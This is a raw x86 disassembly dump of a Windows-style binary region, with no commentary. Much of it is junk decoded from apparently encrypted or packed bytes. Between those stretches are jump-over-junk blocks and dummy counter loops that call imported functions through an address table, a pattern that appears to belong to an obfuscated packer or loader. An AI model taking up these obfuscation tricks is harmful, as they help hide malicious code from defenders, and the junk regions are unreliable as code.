  40b0b9:	leave  
  40b0ba:	aas    
  40b0bb:	jle    0x40b13b
  40b0bd:	mov    dh,0x7e
  40b0bf:	jle    0x40b13f
  40b0c1:	xchg   ecx,eax
  40b0c2:	mov    ch,BYTE PTR [eax]
  40b0c4:	add    eax,DWORD PTR [eax-0x39]
  40b0c7:	push   esi
  40b0c8:	in     eax,dx
  40b0c9:	pop    ebx
  40b0ca:	mov    BYTE PTR [edi],cl
  40b0cc:	add    al,0xb0
  40b0ce:	lahf   
  40b0cf:	mov    cl,0x39
  40b0d1:	ins    DWORD PTR es:[edi],dx
  40b0d2:	jle    0x40b09a
  40b0d4:	cmp    eax,0x881cfddd
  40b0d9:	mov    ah,BYTE PTR [eax]
  40b0db:	sbb    eax,0xd9f6f78
  40b0e0:	daa    
  40b0e1:	fnstenv [eax-0x4bff6f6]
  40b0e7:	lea    eax,[edi+0x4984c7c4]
  40b0ed:	aad    0x57
  40b0ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0f0:	xor    al,0xd3
  40b0f2:	adc    al,0xdd
  40b0f4:	pop    ebx
  40b0f5:	add    bl,dh
  40b0f7:	push   esp
  40b0f8:	in     eax,dx
  40b0f9:	sub    eax,0xff41d848
  40b0fe:	mov    cl,0xa9
  40b100:	mov    ds:0x8db47638,eax
  40b105:	fiadd  DWORD PTR [eax-0x9]
  40b108:	jnp    0x40b188
  40b10a:	popa   
  40b10b:	in     eax,0xf5
  40b10d:	rol    ebp,1
  40b10f:	bound  eax,QWORD PTR [eax]
  40b111:	sbb    DWORD PTR [edi+esi*2],edi
  40b114:	pop    ecx
  40b115:	cmc    
  40b116:	test   al,0x29
  40b118:	sub    eax,0x62e7700
  40b11d:	popf   
  40b11e:	(bad)  
  40b11f:	cmp    eax,DWORD PTR [ecx]
  40b121:	adc    ch,bh
  40b123:	adc    al,0x90
  40b125:	inc    ebp
  40b126:	xchg   ecx,eax
  40b127:	leave  
  40b128:	and    edi,ebp
  40b12a:	xor    esi,DWORD PTR [ebx-0x7e3b0657]
  40b130:	rol    BYTE PTR [eax],cl
  40b132:	cs into 
  40b134:	(bad)  
  40b136:	jmp    0x132d093d
  40b13b:	call   0xb3e630b7
  40b140:	mov    al,ds:0xd3ab219d
  40b145:	call   0x8c0c7e5b
  40b14a:	push   esi
  40b14b:	inc    eax
  40b14c:	loope  0x40b0d1
  40b14e:	push   edx
  40b14f:	or     bh,BYTE PTR [ecx+0x49875f0b]
  40b155:	test   al,0x83
  40b157:	ins    DWORD PTR es:[edi],dx
  40b158:	iret   
  40b159:	stc    
  40b15a:	retf   
  40b15b:	js     0x40b0f4
  40b15d:	retf   
  40b15e:	and    esi,DWORD PTR [edi+0x4aba9f06]
  40b164:	cmp    al,0xb8
  40b166:	lods   eax,DWORD PTR ds:[esi]
  40b167:	sub    ecx,edx
  40b169:	xor    dl,cl
  40b16b:	dec    edi
  40b16c:	sbb    dh,ch
  40b16e:	test   eax,0x5faa801d
  40b173:	bound  edi,QWORD PTR [eax]
  40b175:	les    ecx,FWORD PTR [esi]
  40b177:	cmp    ch,BYTE PTR [edi]
  40b179:	inc    esp
  40b17a:	mov    dh,cl
  40b17c:	jp     0x40b1b7
  40b17e:	test   BYTE PTR [ebx+ebp*8],bh
  40b181:	jo     0x40b1e8
  40b183:	xlat   BYTE PTR ds:[ebx]
  40b184:	xlat   BYTE PTR ds:[ebx]
  40b185:	pop    ss
  40b186:	jle    0x40b18b
  40b188:	out    dx,al
  40b189:	mov    DWORD PTR [ebp-0x8],esi
  40b18c:	movzx  ecx,BYTE PTR ds:0x41abce
  40b193:	and    DWORD PTR ds:0x415115,ecx
  40b199:	jmp    0x40b27e
  40b19e:	mov    ebp,0xc5aa0686
  40b1a3:	stos   BYTE PTR es:[edi],al
  40b1a4:	popa   
  40b1a5:	jns    0x40b1e6
  40b1a7:	in     eax,dx
  40b1a8:	(bad)  
  40b1a9:	mov    ah,0x6d
  40b1ab:	xor    al,0x1f
  40b1ad:	sub    al,BYTE PTR [ecx]
  40b1af:	cmp    al,0x7e
  40b1b1:	jle    0x40b169
  40b1b3:	jle    0x40b233
  40b1b5:	jle    0x40b21a
  40b1b7:	cld    
  40b1b8:	in     al,dx
  40b1b9:	adc    DWORD PTR [ecx+0x5aeddc97],0x709f9178
  40b1c3:	loop   0x40b209
  40b1c5:	mov    ebp,0xe7af230
  40b1ca:	and    esp,DWORD PTR [ecx+0x4261d9ee]
  40b1d0:	sub    al,BYTE PTR [ecx+0x17]
  40b1d3:	js     0x40b1aa
  40b1d5:	add    DWORD PTR [eax-0x77],ebp
  40b1d8:	stos   DWORD PTR es:[edi],eax
  40b1d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1da:	cmp    cl,BYTE PTR [ebx]
  40b1dc:	repz jnp 0x40b1c6
  40b1df:	in     eax,dx
  40b1e0:	mov    WORD PTR [ebp+edi*8-0x76],gs
  40b1e4:	jge    0x40b22c
  40b1e6:	push   cs
  40b1e7:	sub    DWORD PTR [eax+0x5f],ebx
  40b1ea:	mov    al,ds:0x60ad76cd
  40b1ef:	loope  0x40b1fa
  40b1f1:	popf   
  40b1f2:	mov    dh,0x83
  40b1f4:	or     esi,DWORD PTR [edi-0x3a]
  40b1f7:	xchg   ebx,eax
  40b1f8:	pop    ds
  40b1f9:	clc    
  40b1fa:	and    bl,BYTE PTR [ecx-0x46e39dec]
  40b200:	push   eax
  40b201:	push   edx
  40b202:	mov    al,ds:0xf556df87
  40b207:	jae    0x40b204
  40b209:	and    DWORD PTR [eax],eax
  40b20b:	mov    cl,0xa
  40b20d:	cld    
  40b20e:	dec    edx
  40b20f:	add    eax,DWORD PTR [ebx]
  40b211:	or     ch,cl
  40b213:	xlat   BYTE PTR ds:[ebx]
  40b214:	(bad)  
  40b215:	dec    ebx
  40b216:	scas   eax,DWORD PTR es:[edi]
  40b217:	aaa    
  40b218:	adc    eax,0x7649def0
  40b21d:	pop    eax
  40b21e:	enter  0xd3a9,0xa3
  40b222:	retf   
  40b223:	mov    ds:0xe658f238,al
  40b228:	retf   
  40b229:	repz jecxz 0x40b222
  40b22c:	push   esp
  40b22d:	shl    DWORD PTR [esi],0x96
  40b230:	aaa    
  40b231:	adc    ch,bl
  40b233:	mov    eax,DWORD PTR [ecx]
  40b235:	enter  0xd0ab,0x78
  40b239:	ss rol esp,cl
  40b23c:	mov    eax,0x41f7fb54
  40b241:	mov    dl,0x8b
  40b243:	int    0x43
  40b245:	(bad)  
  40b246:	fdiv   QWORD PTR [ebp+0x1b9a772e]
  40b24c:	mov    DWORD PTR [eax+eax*4+0x88688a8],ebp
  40b253:	adc    esi,ecx
  40b255:	test   esi,esp
  40b257:	add    BYTE PTR [esi+0x54],0x75
  40b25b:	ja     0x40b286
  40b25d:	adc    ch,BYTE PTR [edi+0x4480848c]
  40b263:	inc    eax
  40b264:	sub    ch,BYTE PTR [ecx+esi*2+0x556dd6a]
  40b26b:	adc    DWORD PTR [esi+0xef2565c],edi
  40b271:	out    0x4c,eax
  40b273:	addr16 mov fs,edi
  40b276:	and    al,0xa7
  40b278:	push   es
  40b279:	pop    ecx
  40b27a:	leave  
  40b27b:	cmp    al,0x17
  40b27d:	add    cl,BYTE PTR [ebx+0x2d81e84d]
  40b283:	std    
  40b284:	push   eax
  40b285:	inc    ecx
  40b286:	add    dl,bl
  40b288:	stos   DWORD PTR es:[edi],eax
  40b289:	inc    ecx
  40b28a:	add    BYTE PTR [ebx],dh
  40b28c:	enter  0xff33,0x9
  40b290:	cmp    eax,0x41236c
  40b295:	add    ecx,ebx
  40b297:	not    eax
  40b299:	mov    DWORD PTR [ebp-0x20],ecx
  40b29c:	mov    eax,DWORD PTR [ebp-0x20]
  40b29f:	je     0x40bb71
  40b2a5:	mov    eax,ds:0x415105
  40b2aa:	xor    DWORD PTR ds:0x412354,eax
  40b2b0:	mov    eax,DWORD PTR [ebp-0x4]
  40b2b3:	xor    eax,0x7510859
  40b2b8:	and    DWORD PTR ds:0x4245ae,0x412358
  40b2c2:	add    eax,ebx
  40b2c4:	mov    DWORD PTR ds:0x4245ae,0x20c7
  40b2ce:	cmp    edi,eax
  40b2d0:	jmp    0x40b3b5
  40b2d5:	push   edi
  40b2d6:	pop    es
  40b2d7:	popf   
  40b2d8:	aam    0x6d
  40b2da:	fs push edi
  40b2dc:	test   DWORD PTR [edx+0x4ae65a33],edx
  40b2e2:	or     dh,bl
  40b2e4:	fistp  WORD PTR [ecx+0x3c]
  40b2e7:	jle    0x40b367
  40b2e9:	mov    dh,0x7e
  40b2eb:	jle    0x40b36b
  40b2ed:	fwait
  40b2ee:	push   ds
  40b2ef:	cmp    esp,DWORD PTR [edx+0x5e]
  40b2f2:	xor    cl,bl
  40b2f4:	add    eax,0xbc8766e7
  40b2f9:	xor    dl,BYTE PTR [ebp-0x6e]
  40b2fc:	add    bh,BYTE PTR [eax-0x420de81e]
  40b302:	push   0x49
  40b304:	icebp  
  40b305:	and    BYTE PTR [ecx],0xb8
  40b308:	ja     0x40b2ae
  40b30a:	data16 mov dh,0x96
  40b30d:	and    eax,0xcd33e9eb
  40b312:	loope  0x40b2d5
  40b314:	push   esp
  40b315:	xlat   BYTE PTR ds:[ebx]
  40b316:	sub    eax,0x1f1f5ead
  40b31b:	or     BYTE PTR [eax+ebx*2-0x1d83031b],dl
  40b322:	cmp    eax,0x3865f5ff
  40b327:	sub    dh,BYTE PTR [edx-0x45]
  40b32a:	pushf  
  40b32b:	into   
  40b32c:	fisub  WORD PTR [eax]
  40b32e:	cmp    eax,0xa85f2590
  40b333:	nop
  40b334:	imul   ecx,DWORD PTR [edi],0x9538262e
  40b33a:	repz rcr dh,1
  40b33d:	push   eax
  40b33e:	cwde   
  40b33f:	div    BYTE PTR [ecx]
  40b341:	ins    DWORD PTR es:[edi],dx
  40b342:	xchg   dl,cl
  40b344:	add    al,BYTE PTR [edx+ebp*1+0xa]
  40b348:	in     al,0xed
  40b34a:	pop    es
  40b34b:	mov    dh,0x11
  40b34d:	jle    0x40b3b4
  40b34f:	pushf  
  40b350:	mov    cl,0xef
  40b352:	mov    cl,0x71
  40b354:	das    
  40b355:	(bad)  
  40b356:	(bad)  
  40b357:	int3   
  40b358:	pop    ebp
  40b359:	call   0x3aec54dd
  40b35e:	xor    al,0x5f
  40b360:	mov    esp,0x5d86ead5
  40b365:	sbb    esi,edx
  40b367:	stc    
  40b368:	jo     0x40b38f
  40b36a:	in     al,dx
  40b36b:	add    dh,BYTE PTR [edx-0x34]
  40b36e:	xchg   esi,eax
  40b36f:	popf   
  40b370:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b371:	(bad)  
  40b373:	jmp    0x40b33d
  40b375:	std    
  40b376:	outs   dx,DWORD PTR ds:[esi]
  40b377:	loope  0x40b317
  40b379:	cld    
  40b37a:	sahf   
  40b37b:	ins    BYTE PTR es:[edi],dx
  40b37c:	sub    esp,ebp
  40b37e:	icebp  
  40b37f:	icebp  
  40b380:	mov    esp,0xfe9a8733
  40b385:	retf   0xe6cc
  40b388:	jb     0x40b353
  40b38a:	pop    eax
  40b38b:	(bad)  
  40b38c:	(bad)  
  40b38e:	ret    
  40b38f:	jb     0x40b3d1
  40b391:	sub    DWORD PTR [edi+0x24ecc74f],ecx
  40b397:	jle    0x40b415
  40b399:	pop    ecx
  40b39a:	pushf  
  40b39b:	pushf  
  40b39c:	adc    al,0xe
  40b39e:	xor    BYTE PTR [ebx],0x84
  40b3a1:	sbb    bh,BYTE PTR [edx+0x3e50efeb]
  40b3a7:	ja     0x40b3d6
  40b3a9:	(bad)  
  40b3aa:	in     al,dx
  40b3ab:	ins    DWORD PTR es:[edi],dx
  40b3ac:	mov    dl,0x65
  40b3ae:	push   ds
  40b3af:	addr16 or cl,bl
  40b3b2:	and    ecx,eax
  40b3b4:	pop    esi
  40b3b5:	jne    0x40b94a
  40b3bb:	push   DWORD PTR [ebp+0x8]
  40b3be:	mov    DWORD PTR ds:0x41abe2,0x7935
  40b3c8:	call   0x40a5e1
  40b3cd:	and    DWORD PTR ds:0x41237c,0x0
  40b3d7:	jmp    0x40b3eb
  40b3dc:	xor    ecx,ecx
  40b3de:	add    ecx,DWORD PTR ds:0x41237c
  40b3e4:	inc    ecx
  40b3e5:	mov    DWORD PTR ds:0x41237c,ecx
  40b3eb:	cmp    DWORD PTR ds:0x41237c,0x18
  40b3f2:	jae    0x40b452
  40b3f8:	cmp    DWORD PTR ds:0x41237c,0x24
  40b3ff:	jne    0x40b40e
  40b405:	push   DWORD PTR [ebp-0x14]
  40b408:	call   DWORD PTR ds:0x40d02c
  40b40e:	jmp    0x40b3dc
  40b413:	mov    DWORD PTR ds:0x415101,0x17
  40b41d:	cmp    DWORD PTR ds:0x415101,0x0
  40b424:	je     0x40b452
  40b42a:	cmp    DWORD PTR ds:0x415101,0x1d
  40b431:	jne    0x40b440
  40b437:	push   DWORD PTR [ebp-0xc]
  40b43a:	call   DWORD PTR ds:0x40d3a4
  40b440:	mov    esi,DWORD PTR ds:0x415101
  40b446:	dec    esi
  40b447:	mov    DWORD PTR ds:0x415101,esi
  40b44d:	jmp    0x40b41d
  40b452:	mov    DWORD PTR [ebp-0x20],eax
  40b455:	and    DWORD PTR ds:0x4245c2,0x0
  40b45f:	mov    eax,ds:0x4245c2
  40b464:	inc    eax
  40b465:	mov    ds:0x4245c2,eax
  40b46a:	cmp    DWORD PTR ds:0x4245c2,0x6
  40b471:	jne    0x40b485
  40b477:	push   DWORD PTR [ebp-0x10]
  40b47a:	push   0x41ad5b
  40b47f:	call   DWORD PTR ds:0x40d20c
  40b485:	cmp    DWORD PTR ds:0x4245c2,0x5
  40b48c:	jne    0x40b4a0
  40b492:	xor    eax,eax
  40b494:	or     eax,DWORD PTR ds:0x4245c2
  40b49a:	inc    eax
  40b49b:	mov    ds:0x4245c2,eax
  40b4a0:	cmp    DWORD PTR ds:0x4245c2,0x15
  40b4a7:	jb     0x40b45f
  40b4ad:	mov    DWORD PTR ds:0x41abca,0x15
  40b4b7:	cmp    DWORD PTR ds:0x41abca,0x0
  40b4be:	je     0x40b50b
  40b4c4:	cmp    DWORD PTR ds:0x41abca,0x22
  40b4cb:	jne    0x40b4f1
  40b4d1:	push   DWORD PTR [ebp-0x14]
  40b4d4:	push   DWORD PTR [ebp-0xc]
  40b4d7:	push   DWORD PTR [ebp-0x18]
  40b4da:	push   DWORD PTR [ebp-0x14]
  40b4dd:	push   DWORD PTR [ebp-0x1c]
  40b4e0:	push   DWORD PTR [ebp-0x1c]
  40b4e3:	push   0x15ca
  40b4e8:	push   DWORD PTR [ebp-0x28]
  40b4eb:	call   DWORD PTR ds:0x40d030
  40b4f1:	xor    ecx,ecx
  40b4f3:	or     ecx,DWORD PTR ds:0x41abca
  40b4f9:	dec    ecx
  40b4fa:	mov    DWORD PTR ds:0x41abca,ecx
  40b500:	jmp    0x40b4b7
  40b505:	sbb    DWORD PTR ds:0x41abd6,edi
  40b50b:	mov    eax,DWORD PTR [ebp-0x4]
  40b50e:	mov    ecx,DWORD PTR [ebp-0x20]
  40b511:	not    esi
  40b513:	mov    esi,0x7510859
  40b518:	xor    eax,esi
  40b51a:	sub    DWORD PTR ds:0x4245b6,0x7cc8
  40b524:	add    eax,ebx
  40b526:	cmp    ecx,eax
  40b528:	jmp    0x40b60d
  40b52d:	add    edi,ebx
  40b52f:	or     al,0xde
  40b531:	in     al,0xe9
  40b533:	loope  0x40b530
  40b535:	js     0x40b579
  40b537:	dec    ebp
  40b538:	inc    edi
  40b539:	inc    esp
  40b53a:	in     al,dx
  40b53b:	adc    DWORD PTR ds:0x7e7e3d91,eax
  40b541:	mov    dh,0x7e
  40b543:	jle    0x40b5c3
  40b545:	(bad)  
  40b546:	pusha  
  40b547:	iret   
  40b548:	jnp    0x40b5c3
  40b54a:	adc    dh,BYTE PTR [esi-0x60276681]
  40b550:	fcmovnbe st,st(1)
  40b552:	stos   DWORD PTR es:[edi],eax
  40b553:	pop    ds
  40b554:	push   ds
  40b555:	push   ds
  40b556:	mov    esi,0x99b9eeaa
  40b55b:	pop    ebx
  40b55c:	jbe    0x40b5a5
  40b55e:	mov    ebx,0x2fb1e9df
  40b563:	add    al,0xea
  40b565:	mov    bh,0x14
  40b567:	push   0xffffff8c
  40b569:	ja     0x40b4f6
  40b56b:	(bad)  
  40b56c:	(bad)  [ebx]
  40b56e:	mov    ah,0x58
  40b570:	xchg   DWORD PTR [ebp-0x3a91d4f5],ebx
  40b576:	(bad)  
  40b577:	xchg   esp,eax
  40b578:	pusha  
  40b579:	popa   
  40b57a:	iret   
  40b57b:	not    BYTE PTR ds:0xcb5528ab
  40b581:	call   0xbc70:0xd70609ba
  40b588:	jge    0x40b52b
  40b58a:	pop    DWORD PTR [eax]
  40b58c:	or     esi,DWORD PTR [edx-0x4a]
  40b58f:	sti    
  40b590:	cli    
  40b591:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b592:	pop    esp
  40b593:	dec    eax
  40b594:	add    bl,ah
  40b596:	in     eax,dx
  40b597:	test   al,0x84
  40b599:	jecxz  0x40b58a
  40b59b:	mov    ds:0xf6ad2f69,eax
  40b5a0:	jnp    0x40b575
  40b5a2:	lock fild DWORD PTR [ecx+0x33cdfe8c]
  40b5a9:	mov    edx,0x78772cbd
  40b5ae:	mov    eax,ds:0xe09996e
  40b5b3:	jg     0x40b56d
  40b5b5:	jno    0x40b53d
  40b5b7:	mov    ch,BYTE PTR [edx+0x17a587f0]
  40b5bd:	mov    DWORD PTR [edi],esp
  40b5bf:	fbstp  TBYTE PTR [ebx]
  40b5c1:	xchg   ebp,eax
  40b5c2:	pop    es
  40b5c3:	push   ss
  40b5c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5c5:	call   0x6c97:0x9668005c
  40b5cc:	inc    ecx
  40b5cd:	mov    dl,0xe3
  40b5cf:	xchg   ebx,eax
  40b5d0:	mov    ah,0xfc
  40b5d2:	into   
  40b5d3:	dec    eax
  40b5d4:	mov    ecx,DWORD PTR [edx+0x47e11ee1]
  40b5da:	mov    bh,BYTE PTR [ecx]
  40b5dc:	inc    ebp
  40b5dd:	ds stos BYTE PTR es:[edi],al
  40b5df:	xchg   ecx,eax
  40b5e0:	ja     0x40b603
  40b5e2:	(bad)  
  40b5e4:	pushf  
  40b5e5:	cli    
  40b5e6:	ja     0x40b5c6
  40b5e8:	xchg   edi,eax
  40b5e9:	gs sub eax,0xcabcca7d
  40b5ef:	fistp  WORD PTR [edx]
  40b5f1:	mov    al,ds:0x8fc20a00
  40b5f6:	(bad)  
  40b5f7:	ror    BYTE PTR [ecx+0x45a042df],cl
  40b5fd:	jb     0x40b65c
  40b5ff:	mov    ds:0x3fd4454a,eax
  40b604:	or     bl,ch
  40b606:	sbb    ah,BYTE PTR [edx+0x1b]
  40b609:	mov    edi,edx
  40b60b:	jo     0x40b5d5
  40b60d:	je     0x40bb55
  40b613:	sbb    DWORD PTR ds:0x415115,0x412368
  40b61d:	push   DWORD PTR [ebp-0x20]
  40b620:	jmp    0x40b705
  40b625:	sti    
  40b626:	loopne 0x40b67d
  40b628:	lock push ebp
  40b62a:	cdq    
  40b62b:	sti    
  40b62c:	jns    0x40b666
  40b62e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b62f:	pop    ecx
  40b630:	out    0xbf,al
  40b632:	push   ebx
  40b633:	clc    
  40b634:	inc    ebx
  40b635:	jmp    0xb6bf346c
  40b63a:	jle    0x40b6ba
  40b63c:	jle    0x40b5cd
  40b63e:	js     0x40b608
  40b640:	leave  
  40b641:	mov    bl,BYTE PTR [ebx]
  40b643:	(bad)  
  40b644:	into   
  40b645:	jne    0x40b63f
  40b647:	mov    eax,0x170f8160
  40b64c:	and    DWORD PTR [edi-0x10],edi
  40b64f:	or     BYTE PTR [ebx],dl
  40b651:	out    dx,al
  40b652:	rcr    ecx,0xf
  40b655:	lods   al,BYTE PTR ds:[esi]
  40b656:	fistp  DWORD PTR [edx]
  40b658:	adc    al,ch
  40b65a:	add    BYTE PTR [edx+0x5f],al
  40b65d:	add    eax,DWORD PTR [eax]
  40b65f:	shl    bh,cl
  40b661:	xor    DWORD PTR [eax+0x1a5771eb],eax
  40b667:	sbb    BYTE PTR [eax+ebx*1],dl
  40b66a:	aaa    
  40b66b:	out    dx,eax
  40b66c:	and    bl,BYTE PTR [esi+edi*1+0x7e]
  40b670:	jae    0x40b6d1
  40b672:	scas   eax,DWORD PTR es:[edi]
  40b673:	sbb    DWORD PTR [ebp-0x2d25f98d],edx
  40b679:	mov    edi,0xce7f089e
  40b67e:	jb     0x40b648
  40b680:	scas   al,BYTE PTR es:[edi]
  40b681:	sub    edi,DWORD PTR [esi]
  40b683:	sbb    al,0x5e
  40b685:	mov    esi,0x302a15ec
  40b68a:	aas    
  40b68b:	fcomp  DWORD PTR [ebx+esi*8+0x3]
  40b68f:	inc    ecx
  40b690:	loopne 0x40b68f
  40b692:	mov    eax,0xfa3aa604
  40b697:	aam    0x6c
  40b699:	lock leave 
  40b69b:	in     al,dx
  40b69c:	xchg   esi,eax
  40b69d:	dec    ebp
  40b69e:	scas   al,BYTE PTR es:[edi]
  40b69f:	mov    BYTE PTR [ebp-0x245985eb],bl
  40b6a5:	add    al,0x6d
  40b6a7:	mov    al,0x3
  40b6a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6aa:	gs mov edi,ebp
  40b6ad:	xchg   ecx,eax
  40b6ae:	sbb    bl,BYTE PTR ds:0x32e89987
  40b6b4:	push   es
  40b6b5:	xchg   edx,eax
  40b6b6:	pop    eax
  40b6b7:	mov    eax,ds:0x3de940c1
  40b6bc:	in     al,0xe9
  40b6be:	and    al,0xf5
  40b6c0:	fsubr  DWORD PTR [eax-0x24]
  40b6c3:	pop    edi
  40b6c4:	inc    dx
  40b6c6:	in     al,0xf9
  40b6c8:	xchg   esi,eax
  40b6c9:	stos   BYTE PTR es:[edi],al
  40b6ca:	and    eax,0x1ee96b9
  40b6cf:	xchg   edi,eax
  40b6d0:	out    dx,eax
  40b6d1:	push   edx
  40b6d2:	shr    BYTE PTR ds:0x51f41759,0x18
  40b6d9:	ss dec ebx
  40b6db:	mov    ds:0xd4abd054,al
  40b6e0:	(bad)  
  40b6e1:	aas    
  40b6e2:	test   eax,0xb3905dd5
  40b6e7:	fs jne 0x40b70b
  40b6ea:	leave  
  40b6eb:	cmp    cl,0x2d
  40b6ee:	pusha  
  40b6ef:	sbb    DWORD PTR [ebx-0x5d],esp
  40b6f2:	je     0x40b67d
  40b6f4:	stos   DWORD PTR es:[edi],eax
  40b6f5:	adc    eax,0xf748f602
  40b6fa:	in     eax,dx
  40b6fb:	loope  0x40b6a0
  40b6fd:	or     dl,BYTE PTR [esi-0x6b]
  40b700:	in     al,dx
  40b701:	dec    eax
  40b702:	inc    edi
  40b703:	rcl    DWORD PTR [eax-0x17f78a01],0xbd
  40b70a:	out    dx,eax
  40b70b:	(bad)  
  40b70c:	dec    DWORD PTR [ecx]
  40b70e:	cmp    eax,0x41abde
  40b713:	mov    DWORD PTR [ebp-0x14],eax
  40b716:	mov    eax,DWORD PTR [ebp-0x4]
  40b719:	adc    ecx,DWORD PTR ds:0x412370
  40b71f:	mov    ecx,DWORD PTR [ebp-0x14]
  40b722:	adc    DWORD PTR ds:0x4245ba,0x45e4
  40b72c:	xor    eax,esi
  40b72e:	add    eax,ebx
  40b730:	mov    DWORD PTR ds:0x415111,0x202e
  40b73a:	cmp    ecx,eax
  40b73c:	mov    DWORD PTR ds:0x412364,0x4412
  40b746:	je     0x40bb55
  40b74c:	and    DWORD PTR ds:0x417e49,0x0
  40b756:	mov    eax,ds:0x417e49
  40b75b:	inc    eax
  40b75c:	mov    ds:0x417e49,eax
  40b761:	cmp    DWORD PTR ds:0x417e49,0x22
  40b768:	jne    0x40b798
  40b76e:	push   0x415115
  40b773:	push   0x2bf6
  40b778:	push   DWORD PTR [ebp-0x14]
  40b77b:	push   0x415111
  40b780:	push   DWORD PTR [ebp-0x10]
  40b783:	push   0x41adfd
  40b788:	push   0x4def
  40b78d:	push   0x3000
  40b792:	call   DWORD PTR ds:0x40d210
  40b798:	cmp    DWORD PTR ds:0x417e49,0x12
  40b79f:	jb     0x40b756
  40b7a5:	mov    eax,DWORD PTR [ebp-0x14]
  40b7a8:	mov    eax,DWORD PTR [eax+0x18]
  40b7ab:	movzx  ecx,BYTE PTR ds:0x417e4d
  40b7b2:	sbb    DWORD PTR ds:0x41237c,ecx
  40b7b8:	mov    DWORD PTR [ebp-0x20],eax
  40b7bb:	xor    eax,eax
  40b7bd:	or     eax,DWORD PTR ds:0x412390
  40b7c3:	xor    ecx,ecx
  40b7c5:	xor    ecx,DWORD PTR ds:0x417eaa
  40b7cb:	sub    ecx,eax
  40b7cd:	sub    eax,DWORD PTR [eax+ecx*1]
  40b7d0:	mov    eax,DWORD PTR [ebp-0x14]
  40b7d3:	sub    DWORD PTR ds:0x4245b6,0x1830
  40b7dd:	mov    ecx,DWORD PTR [ebp+0x8]
  40b7e0:	add    DWORD PTR ds:0x41235c,0x415101
  40b7ea:	add    ecx,DWORD PTR [eax+0x20]
  40b7ed:	mov    DWORD PTR [ebp-0x28],ecx
  40b7f0:	mov    DWORD PTR ds:0x417e59,0x1f
  40b7fa:	cmp    DWORD PTR ds:0x417e59,0x0
  40b801:	je     0x40b84b
  40b807:	cmp    DWORD PTR ds:0x417e59,0xf
  40b80e:	jne    0x40b823
  40b814:	push   DWORD PTR [ebp-0x1c]
  40b817:	push   DWORD PTR [ebp-0x10]
  40b81a:	push   DWORD PTR [ebp-0x28]
  40b81d:	call   DWORD PTR ds:0x40d034
  40b823:	cmp    DWORD PTR ds:0x417e59,0x10
  40b82a:	jne    0x40b83b
  40b830:	mov    eax,ds:0x417e59
  40b835:	dec    eax
  40b836:	mov    ds:0x417e59,eax
  40b83b:	mov    eax,ds:0x417e59
  40b840:	dec    eax
  40b841:	mov    ds:0x417e59,eax
  40b846:	jmp    0x40b7fa
  40b84b:	mov    eax,DWORD PTR [ebp-0x14]
  40b84e:	mov    ecx,DWORD PTR [ebp+0x8]
  40b851:	add    ecx,DWORD PTR [eax+0x24]
  40b854:	jmp    0x40b939
  40b859:	mov    ch,0x76
  40b85b:	or     DWORD PTR [ecx+ecx*2+0x59],eax
  40b85f:	pop    ecx
  40b860:	pop    es
  40b861:	aas    
  40b862:	mov    edx,0x510623e6
  40b867:	cwde   
  40b868:	test   BYTE PTR [ecx],ah
  40b86a:	xor    edi,DWORD PTR [esi+0x7e]
  40b86d:	mov    dh,0x7e
  40b86f:	jle    0x40b8ef
  40b871:	ret    
  40b872:	sahf   
  40b873:	sbb    eax,eax
  40b875:	xchg   al,dl
  40b877:	cld    
  40b878:	aas    
  40b879:	aas    
  40b87a:	xor    BYTE PTR [esi],0xc9
  40b87d:	inc    esi
  40b87f:	push   cs
  40b880:	ss jo  0x40b89e
  40b883:	xor    dl,BYTE PTR [edi+0x2fd02caa]
  40b889:	out    0xb2,eax
  40b88b:	adc    ch,dl
  40b88d:	xchg   ecx,eax
  40b88e:	push   esi
  40b88f:	loopne 0x40b899
  40b891:	xchg   esp,eax
  40b892:	dec    eax
  40b893:	sbb    al,0x1e
  40b895:	jp     0x40b90a
  40b897:	stos   DWORD PTR es:[edi],eax
  40b898:	dec    ebx
  40b899:	es dec edx
  40b89b:	aas    
  40b89c:	dec    edx
  40b89d:	push   edi
  40b89e:	test   al,0x43
  40b8a0:	push   esp
  40b8a1:	mov    esi,0xac66ad69
  40b8a6:	fld    TBYTE PTR [ecx+0x37424a23]
  40b8ac:	iret   
  40b8ad:	imul   esi,DWORD PTR [esp+ebx*2+0x13],0x506ec945
  40b8b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8b6:	rcl    BYTE PTR [ebx+0x6253e613],0x9a
  40b8bd:	xchg   esi,eax
  40b8be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8bf:	push   ebp
  40b8c0:	ret    0xe30a
  40b8c3:	add    al,0x84
  40b8c5:	(bad)  
  40b8c7:	mov    bh,BYTE PTR [edi+ecx*8+0x7cb9b60f]
  40b8ce:	cmp    eax,0x61e3b12c
  40b8d3:	dec    esp
  40b8d4:	xor    al,0x3b
  40b8d6:	(bad)  
  40b8d7:	loop   0x40b92c
  40b8d9:	pop    ecx
  40b8da:	push   DWORD PTR [eax]
  40b8dc:	mov    ds:0x191a7772,al
  40b8e1:	lahf   
  40b8e2:	fsubp  st(3),st
  40b8e4:	pop    es
  40b8e5:	xor    WORD PTR es:[edi+0x1b],cx
  40b8ea:	je     0x40b94a
  40b8ec:	in     al,0xc1
  40b8ee:	fstp   DWORD PTR [ebx-0x4e4fc4f8]
  40b8f4:	repnz (bad) 
  40b8f6:	stc    
  40b8f7:	xor    ah,BYTE PTR [edi+0x3130083e]
  40b8fd:	mov    eax,0x83a47bcc
  40b902:	sub    ebp,ebp
  40b904:	pop    esi
  40b905:	jno    0x40b8ad
  40b907:	inc    ebp
  40b908:	sub    BYTE PTR [edx+ebx*8],dl
  40b90b:	mov    ebp,0xd9300179
  40b910:	cmc    
  40b911:	imul   ecx
  40b913:	cmp    eax,0xf72cdf4f
  40b918:	jl     0x40b931
  40b91a:	sbb    cl,BYTE PTR [ecx-0x1b586209]
  40b920:	lock imul ebp,edi,0x1be2ec2b
  40b927:	dec    edx
  40b928:	scas   al,BYTE PTR es:[edi]
  40b929:	adc    esp,DWORD PTR [edx+0x435fe4a8]
  40b92f:	js     0x40b982
  40b931:	push   ebx
  40b932:	call   0xacebe1a4
  40b937:	(bad)  
